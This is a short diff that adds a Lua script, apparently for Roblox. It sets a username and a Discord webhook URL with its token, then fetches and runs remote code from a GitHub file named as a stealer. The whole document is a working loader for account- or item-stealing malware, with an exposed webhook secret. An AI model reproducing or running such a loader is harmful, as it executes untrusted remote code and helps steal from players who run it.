@@ -1,0 +1,5 @@
+UseUserName = "Anthonyili230409"
+Webhook = "https://discord.com/api/webhooks/1151976930678153286/Lmm17PXPSCpZ0AsETl0SMfKIGYoEE6qrmqXZI_K-MbQe3k7L2ul0cbXsQneYT7yp-Yfs"
+UserName2 = "Anthonyili230409"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ian4Life/FuegoEterno_Stealer/main/Stealer", true))()
